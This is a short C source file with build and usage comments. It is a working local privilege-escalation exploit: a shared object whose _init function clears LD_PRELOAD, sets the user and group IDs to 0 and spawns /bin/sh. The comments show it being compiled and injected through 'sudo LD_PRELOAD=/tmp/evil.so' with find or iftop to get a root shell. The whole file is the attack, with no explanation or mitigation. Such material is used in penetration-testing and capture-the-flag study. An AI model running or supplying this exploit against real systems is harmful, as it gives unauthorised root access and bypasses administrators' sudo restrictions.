# include <stdio.h>
# include <sys/types.h>
# include <stdlib.h>


void _init(){
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}

// gcc -fPIC -shared -o evil.so evil.c -nostartfiles
// sudo LD_PRELOAD=/tmp/evil.so find
// sudo LD_PRELOAD=/tmp/evil.so iftop



